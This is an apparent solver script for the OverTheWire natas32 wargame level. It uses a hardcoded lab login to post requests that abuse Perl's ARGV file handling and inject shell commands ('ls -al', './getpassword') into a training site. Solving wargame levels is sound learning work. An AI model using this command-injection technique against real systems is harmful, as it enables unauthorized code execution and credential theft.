import requests
                                                             
url = 'http://natas32.natas.labs.overthewire.org/'

auth = ('natas32', 'NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B')

response = requests.post(url + '/index.pl?ls -al . | xargs echo |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)
print(response.text) # Get something like: -rwxr-xr-x 1 natas32 natas32  4096 Jan 01  1970 getpassword

response = requests.post(url + '/index.pl?./getpassword | xargs echo |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)

print(response.text) # Get the password for natas32